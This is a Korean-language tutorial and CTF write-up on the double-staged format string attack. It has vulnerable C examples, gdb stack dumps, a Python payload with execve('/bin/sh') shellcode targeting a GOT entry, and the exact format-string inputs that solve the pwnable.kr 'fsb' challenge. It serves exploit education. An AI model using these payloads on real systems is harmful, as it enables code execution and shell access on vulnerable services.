# Double Staged Format String Bug Attack

[TOC]

------

> Double Format String bug Attack은 Format String Bug가 발생했을 때 Stack에 있는 값을 단 1 byte도 변경할 수 없는 상황에서도 사용할 수 있는 기술입니다. 특히 주소에 Null Byte가 많이 포함되는 64bit에서도 사용가능합니다 .(참고로 그햇 OO홍 님께서 만드신 기술이라고 하네요.) 

> pwn3r의 문서를 참고하였음.

## 1.FSB

형식적이지만 우선 일반적인 Format String Bug(FSB)를 공략하는 방법부터 보도록 한다. 일반적으로 FSB를 공략하는 상황을 예로 들어보자. 

### 1-1. Example Code

```c
#include <stdio.h>

FILE *fp;
int main() {
 	char buf[1024];
 	fgets(buf , 1024 , stdin);
 	fp = fopen("/tmp/trash" , "w");
 	fprintf(fp , buf);
 	fclose(fp);
 	return 0;
}
```

0.3초 만에 인지할 수 있는 FSB 취약점을 가진 프로그램이다. 지역변수 buf에 1024 byte만큼 fgets 함수로 입력을 받고 fprintf함수로 포맷스트링 없이 출력하기 때문에 Format String Bug 취약점이 발생한다. 이러한 형태로 FSB취약점이 있는 프로그램은 스택에 Control 가능한 값이 있기 때문에 이를 인자로 이용해 편리하게 원하는 주소에 값을 덮어씌울 수 있다. 

### 1-2. Stack

```assembly
(gdb) r
Starting program: /root/tmp/fsb 
aaaabbbbcccc

Breakpoint 3, 0x80000663 in main ()
(gdb) x/i $eip
=> 0x80000663 <main+118>:	call   0x80000480 <fprintf@plt>
(gdb) x/100x $esp
0xbffff230:	0x80003410	0xbffff240	0xb7fb55a0	0x80000607
0xbffff240:	0x61616161	0x62626262	0x63636363	0x0016000a
0xbffff250:	0x0016906c	0x000061ec	0x000061ec	0x00000004
0xbffff260:	0x00000004	0x6474e551	0x00000000	0x00000000
0xbffff270:	0x00000000	0x00000000	0x00000000	0x00000006
0xbffff280:	0x00000010	0x6474e552	0xb7fe31d9	0xbffff508
0xbffff290:	0xb7fb4db0	0xb7fff000	0xbffff538	0xb7fe7fd0
0xbffff2a0:	0x00000000	0x00000000	0x00000000	0x00000003
0xbffff2b0:	0x00554e47	0x1464f0df	0x00000000	0xb7fea3c1
0xbffff2c0:	0xbffff508	0x00000000	0xb7fdba75	0xb7fea388
0xbffff2d0:	0x00000001	0x00554e47	0x00000000	0xb7fe3eb0
0xbffff2e0:	0xb7e1234c	0xb7fdb637	0xbffff500	0xbffff4ff
0xbffff2f0:	0x00000200	0xbffff504	0xbffff500	0x0d696910
0xbffff300:	0xbffff2f0	0x00000000	0xb7fe3d89	0xb7e011a8
0xbffff310:	0x0000020f	0xb7fd5858	0x3de00ec7	0xb7fe45a9
0xbffff320:	0x00000001	0x00000001	0xb7e05028	0x0000020f
0xbffff330:	0xb7e0c668	0xb7fd5858	0xbffff38c	0xbffff388
0xbffff340:	0x00000003	0x00000000	0xb7fff000	0xb7fdb5c5
0xbffff350:	0xb7e05028	0x3de00ec7	0xb7e0c668	0xb7e02f12
0xbffff360:	0x01ef0076	0xbffff388	0xbffff418	0x0000020f
0xbffff370:	0x00000008	0x0000001c	0x00000002	0xb7fe8768
0xbffff380:	0xbffff394	0x00000000	0x00000000	0x00000000
0xbffff390:	0x00010000	0xb7fd0001	0xb7fe3f19	0x00000000
0xbffff3a0:	0xb7fffad0	0xbffff420	0xbffff468	0xb7fe4a9b
0xbffff3b0:	0xb7fdb364	0xbffff420	0xb7fffa74	0x00000001
(gdb) 
```

0xbffff230 부터 aaaabbbbcccc가 들어갔음을 확인 할 수 있다. 따라서 FSB 공격이 가능하고 스택에 컨트롤 가능한  값이 있기 때문에 쉽게 공략이 가능하다. 하지만 스택에 컨트롤 가능한 데이터가 전혀 없는 상황이라면?

## 2. Double Staged FSB Attack

만약에 버퍼가 전역변수로 선언되어 있다면, 데이터 영역에 들어가 스택을 컨트롤 할 수 없게 된다.

###  2-1. 메에에모오오리이이

<img src="https://bpsecblog.files.wordpress.com/2016/02/gdb-memory-day1-11.png" width="80%" align="center"></img>

> 출처 : https://bpsecblog.wordpress.com/2016/03/08/gdb_memory_1/

### 2-2. Example Code

```c
#include <stdio.h>

FILE *fp;
char buf[1024];

int main()
{
 	fgets(buf , 1024 , stdin);
 	fp = fopen("/tmp/trash" , "w");
 	fprintf(fp , buf);
 	fclose(fp);
 	return 0;
}
```

이전의 코드와 다른점이 있다면, 계속 얘기 해 왔듯이 버퍼가 전역변수인 것이다. 

Local에서 공격하는 상황일 땐 환경변수영역에 원하는 인자를 구성시켜줌으로써 쉽게 공략이 가능하겠지만 , 위 소스를 컴파일 한 바이너리가 데몬으로 돌아가고 있어 Remote에서 공격해야 하는 입장이라면 , 정말로 스택에 있는 값을 단 1byte도 원하는 대로 조작할 수 없는 상황이다. 

하지만 이 프로그램 역시도 공략이 가능하다. Double Staged Format String Attack의 핵심은 스택에 있는 포인터를 이용해 포인터가 가리키고 있는 주소에 내가 원하는 인자를 덮어주고 , 그 인자에 해당하는 주소에 원하는 값을 써넣는 것이다. 

### 2-3. Stage0, Stage1

즉, 두개의 스테이지로 나누어서 보자면

**Stage0** : 스택에 있는 포인터가 가리키고 있는 값을 *덮어줄 주소*로 조작

**Stage1** : Stage0에서 만들어진 인자를 참조해 원하는 주소에 *원하는 값*을 덮어줌

위 처럼 나눌 수 있다.

### 2-4. Stack Pointer 확인

```assembly
(gdb) x/i $eip
=> 0x8048516 <main+82>: call 0x80483fc <fprintf@plt>
(gdb) x/100x $esp
0xbffff740: 0x0804b008 0x0804a060 0x00284440 0x00283ff4
0xbffff750: 0x08048540 0x00000000 0xbffff7d8 0x00144bd6
0xbffff760: 0x00000001 0xbffff804 0xbffff80c 0xb7fff858
0xbffff770: 0xbffff7c0 0xffffffff 0x0012bff4 0x080482c2
0xbffff780: 0x00000001 0xbffff7c0 0x0011d626 0x0012cab0
0xbffff790: 0xb7fffb48 0x00283ff4 0x00000000 0x00000000
0xbffff7a0: 0xbffff7d8 0x9971399c 0x4e08cee3 0x00000000
0xbffff7b0: 0x00000000 0x00000000 0x00000001 0x08048410
0xbffff7c0: 0x00000000 0x00123230 0x00144afb 0x0012bff4
0xbffff7d0: 0x00000001 0x08048410 0x00000000 0x08048431
0xbffff7e0: 0x080484c4 0x00000001 0xbffff804 0x08048540
0xbffff7f0: 0x08048530 0x0011e030 0xbffff7fc 0x0012c8f8
0xbffff800: 0x00000001 0xbffff924 0x00000000 0xbffff93b
0xbffff810: 0xbffff94b 0xbffff956 0xbffff9a6 0xbffff9c8
0xbffff820: 0xbffff9db 0xbffff9e6 0xbffffe87 0xbffffe93
0xbffff830: 0xbffffee0 0xbffffef5 0xbfffff04 0xbfffff1a
0xbffff840: 0xbfffff2b 0xbfffff34 0xbfffff46 0xbfffff57
0xbffff850: 0xbfffff5f 0xbfffff6d 0xbfffffa3 0xbfffffc3
0xbffff860: 0x00000000 0x00000020 0x0012d420 0x00000021
0xbffff870: 0x0012d000 0x00000010 0x0febf3ff 0x00000006
0xbffff880: 0x00001000 0x00000011 0x00000064 0x00000003
0xbffff890: 0x08048034 0x00000004 0x00000020 0x00000005
0xbffff8a0: 0x00000008 0x00000007 0x00110000 0x00000008
0xbffff8b0: 0x00000000 0x00000009 0x08048410 0x0000000b
0xbffff8c0: 0x000003e8 0x0000000c 0x000003e8 0x0000000d 
```

컴파일하고 fprintf에 브레잌포인트 걸고 메모리를 확인해보니 수많은 스택포인터들이 확인되었다. 스택 포인터는 스택을 가리키고 있는 것을 말한다. 예를 들어 위 스택을 살펴보면 0xbffff764 는 0xbffff804를 가리키고 있다. 

스택 포인터들만 보면 

```assembly
(gdb) x/100x $esp
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... 0xbffff7d8 ..........
0xbffff760: .......... 0xbffff804 0xbffff80c ..........
0xbffff770: 0xbffff7c0 .......... .......... ..........
0xbffff780: .......... 0xbffff7c0 .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: 0xbffff7d8 .......... .......... ..........
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x00000000 .......... .......... ..........
0xbffff7d0: .......... .......... 0x00000000 ..........
0xbffff7e0: .......... .......... 0xbffff804 ..........
0xbffff7f0: .......... .......... 0xbffff7fc 0x0012c8f8
0xbffff800: .......... 0xbffff924 .......... 0xbffff93b
0xbffff810: 0xbffff94b 0xbffff956 0xbffff9a6 0xbffff9c8
0xbffff820: 0xbffff9db 0xbffff9e6 0xbffffe87 0xbffffe93
0xbffff830: 0xbffffee0 0xbffffef5 0xbfffff04 0xbfffff1a
0xbffff840: 0xbfffff2b 0xbfffff34 0xbfffff46 0xbfffff57
0xbffff850: 0xbfffff5f 0xbfffff6d 0xbfffffa3 0xbfffffc3
0xbffff860: .......... .......... .......... ..........
(생략)
```

이제 여기서 사용할 포인터를 정해보자. 우선 사용할 포인터의 개수는 2개이다. 한 개는 fclose@got를 만들어줄 포인터 나머지 한 개는 fclose@got+2를 만들어줄 포인터이다.  

```assembly
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... .......... ..........
0xbffff760: .......... 0xbffff804 .......... ..........
0xbffff770: 0xbffff7c0 .......... .......... ..........
0xbffff780: .......... .......... .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: .......... .......... .......... .......... 
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x00000000 .......... .......... ..........
0xbffff7d0: .......... .......... .......... ..........
0xbffff7e0: .......... .......... .......... ..........
0xbffff7f0: .......... .......... .......... ..........
0xbffff800: .......... 0xbffff924 .......... .......... 
```

이렇게 임의로 2개의 포인터(0xbffff804 , 0xbffff7c0)를 선택했다.

그럼 이제 임의로 지정한 주소 0x08049ffc에 임의의 값 0xdeadbeef를 덮는 것을 최종목표로 하여, 위에서 언급했던 것처럼 Stage를 나누어 Payload를 구상해보자.  

### 2-5. Stage0

```assembly
0x08049ffc: 0x0012ffc0
...
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... .......... ..........
0xbffff760: .......... 0xbffff804 (%n) .......... ..........
0xbffff770: 0xbffff7c0 .......... .......... ..........
0xbffff780: .......... .......... .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: .......... .......... .......... ..........
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x00000000 .......... .......... ..........
0xbffff7d0: .......... .......... .......... ..........
0xbffff7e0: .......... .......... .......... ..........
0xbffff7f0: .......... .......... .......... ..........
0xbffff800: .......... 0x08049ffc .......... .......... 
```

Stage0은 두 스택포인터를 이용해 스택 뒷부분에 Stage1에서 사용할 주소 값을 구성하는 과정이다. 위 로그를 보면 0xbffff804를 가리키는 포인터 자리에서 %n 포맷스트링을 사용함으로써 0xbffff804 메모리에 0x08049ffc라는 주소 값을 덮어썼다. 

```assembly
0x08049ffc: 0x0012ffc0
...
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... .......... ..........
0xbffff760: .......... 0xbffff804 .......... ..........
0xbffff770: 0xbffff7c0 (%n) .......... .......... ..........
0xbffff780: .......... .......... .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: .......... .......... .......... ..........
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x08049ffe .......... ..........
0xbffff7d0: .......... .......... .......... ..........
0xbffff7e0: .......... .......... .......... ..........
0xbffff7f0: .......... .......... .......... ..........
0xbffff800: .......... 0x08049ffc .......... .......... 
```

이번엔 0xbffff7c0 포인터자리에서 %n 포맷스트링을 사용함으로써 0xbffff7c0 메모리에 0x08049ffe라는 주소 값을 덮어썼다. 

### 2-6. Stage1

```assembly
0x08049ffc: 0xdeadffc0 
...
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... .......... ..........
0xbffff760: .......... 0xbffff804 .......... ..........
0xbffff770: 0xbffff7c0 .......... .......... ..........
0xbffff780: .......... .......... .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: .......... .......... .......... ..........
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x08049ffe(%hn) .......... .......... ..........
0xbffff7d0: .......... .......... .......... ..........
0xbffff7e0: .......... .......... .......... ..........
0xbffff7f0: .......... .......... .......... ..........
0xbffff800: .......... 0x08049ffc .......... .......... 
```

Stage1은 Stage0에서 스택에 만들어준 주소 값을 사용해 원하는 주소에 값을 덮어쓰는 과정이다. 아까 전에 만들어준 0x08049ffe자리에서 %hn 포맷스트링을 사용해 해당 주소에 값을 덮어썼다. 

```assembly
0x08049ffc: 0xdeadbeef
...
0xbffff740: .......... .......... .......... ..........
0xbffff750: .......... .......... .......... ..........
0xbffff760: .......... 0xbffff804 .......... ..........
0xbffff770: 0xbffff7c0 .......... .......... ..........
0xbffff780: .......... .......... .......... ..........
0xbffff790: .......... .......... .......... ..........
0xbffff7a0: .......... .......... .......... ..........
0xbffff7b0: .......... .......... .......... ..........
0xbffff7c0: 0x08049ffe .......... .......... ..........
0xbffff7d0: .......... .......... .......... ..........
0xbffff7e0: .......... .......... .......... ..........
0xbffff7f0: .......... .......... .......... ..........
0xbffff800: .......... 0x08049ffc(%hn) .......... ..........
```

이번엔 0x08049ffc자리에서 %hn 포맷스트링을 사용해 해당 주소에 값을 덮어씀으로써 0x08049ffc에 있는 4byte의 데이터를 0xdeadbeef로 조작했다. 

## 3. Exploit

위의 예제를 그대로 익스해보자

( fclose@got 주소는 0x0804a00c 이고 덮어 줄 쉘코드의 주소는 0x804a2a0을 사용할 것이다.)

```python
#!/usr/bin/python

from struct import pack

# fclose@got = 0x0804a00c
# shellcode addr = 0x0804a2a0

stage_0 = ""
stage_0 += "%8x" * 6 		# count = 48 (0x30)
stage_0 += "%134520796x" 	# count = 134520844 (0x0804a00c) ; For fclose@got
stage_0 += "%n"
stage_0 += "%c" * 2 		# count = 134520846 (0x0804a00e) ; For fclose@got + 2
stage_0 += "%n"

stage_1 = ""
stage_1 += "%24562x" 		# count = 134545408 (0x08050000) ; For 0x0000
stage_1 += "%8x" * 17 		# count = 134545544 (0x08050088) ; length = 136
stage_1 += "%1916x" 		# count = 134547460 (0x08050804) ; For 0x0804
stage_1 += "%hn"
stage_1 += "%8x" * 15 		# count = 134547580 (0x0805087c) ; length = 120
stage_1 += "%39460x" 		# count = 134587040 (0x0805a2a0) ; For 0xa2a0
stage_1 += "%hn"

SHELLCODE = ""
SHELLCODE += "\x90" * (1024 - len(stage_0+stage_1) - 25 - 1) # 25 = length of shellcode
SHELLCODE += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" 					# execve("/bin/sh" , {"sh"} , 0) shellcode

payload = stage_0 + stage_1 + SHELLCODE
print payload 
```

Payload로는 Stage0 , Stage1 , NOP + SHELLCODE 이렇게 크게 세 부분으로 나누어진다. NOP + SHELLCODE가 최종적으로 실행시킬 SHELLCODE부분이며, 위에서 설명했듯이 stage0은 stage1에서 사용할 인자를 구성하는 부분이고 stage1은 실제로 원하는 주소에 데이터를 덮어쓰는 부분이다. 

## 4. Pwnable.kr fsb 문제

### 4-1. 문제 확인

<img src="https://user-images.githubusercontent.com/40850499/43204902-1833a3de-905d-11e8-99ed-7c648232d104.png" width="50%" align="center"></img>

먼저 확인해보니 NX가 걸려있고 partial  RELRO로 되어있고 까나리 없고 PIE 없다. 코드는 다음과 같다.

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}
```

main() 에서 /dev/urandom을 이용해 8바이트 읽고 이것을 key 값으로 사용한다. 이후 alloca를 이용해 0x12345 & key 만큼 메모리 할당하는데 fsb를 이용해 직접적으로 key 값에 접근하지 못하게 하기위한 것 같다. 결론적으로 다음 코드에서 FSB가 터진다.

``` c
	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}
```

printf()에서 ("%s" , buf) 형식으로 사용하지 않고 버퍼를 그대로 인자로 사용해 발생하는 취약점이다. 하지만, 보통 fsb같은 경웨는 buf가 전역변수가 아니다. (예로 ftz 11, 20) 하지만, 이 코드를 보면 buf와 buf2가 전역변수로 설정되어있고 스택을 변경할 수가 없다. 따라서 Double Staged Format String Bug Attack 을 이용한다. 

### 4-2. GDB 를 이용한 스택 확인

printf(buf);에 브레이크포인트를 걸고 실행해서 AAAA를 넣어보면 

```assembly
(gdb) x/64wx $esp
0xfff257c0:	0x0804a100	0x0804a100	0x00000064	0x00000000
0xfff257d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff257e0:	0x00000000	0x08048870	0x00000000	0x00000001
0xfff257f0:	0xfff27a58	0xfff27fe9	0xfff25810	0xfff25814
0xfff25800:	0x00000000	0x00000000	0xfff27958	0x08048791
0xfff25810:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25820:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25830:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25840:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25850:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25860:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25870:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25880:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff25890:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff258a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xfff258b0:	0x00000000	0x00000000	0x00000000	0x00000000
```

스택에 보이지 않는다(당연하다 data영역으로 들어간다.) 스택을 조작 할 수 없을 것 같다. 하지만 다행히  0xfff25810이 보인다. 다다다다다다다음 4byte를 부른다. (다*7음이다.) 정리해보자.

i) 스택의 특정 위치를 가리키는 포인터가 저장되어 있고

ii) 위 위치에 접근 가능하기 때문에

Double staged fsb를 사용할 수 있다. 그럼 어디 메모리 주소를 쓰고 그 주소를 뭘로 덮을까

### 4-3. Scenario

시나리오를 생각해보자

printf의 GOT를 fsb()내의 execve("/bin/sh")로 뛰면 된다. 

```bash
fsb@ubuntu:~$ objdump -R ./fsb

./fsb:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   read@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   sleep@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   __gmon_start__
0804a014 R_386_JUMP_SLOT   open@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   execve@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   strtoull@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   close@GLIBC_2.0

....

Breakpoint 1, 0x08048610 in fsb ()
(gdb) x/wx 0x804a004
0x804a004 <printf@got.plt>:	0xf7608f40
```

```bash
   0x080486ab <+375>:	mov    eax,DWORD PTR [ebp-0x24]
   0x080486ae <+378>:	mov    DWORD PTR [esp+0x8],0x0
   0x080486b6 <+386>:	lea    edx,[ebp-0x24]
   0x080486b9 <+389>:	mov    DWORD PTR [esp+0x4],edx
   0x080486bd <+393>:	mov    DWORD PTR [esp],eax
   0x080486c0 <+396>:	call   0x8048450 <execve@plt>
```

### 4-4. Exploit

익스플로잇을 진행해보면

```bash
Give me some format strings(1)
%134520836c%14$n
...
Give me some format strings(2)
%134514347c%20$n
...
$
```

와 같이 할 수 있다.



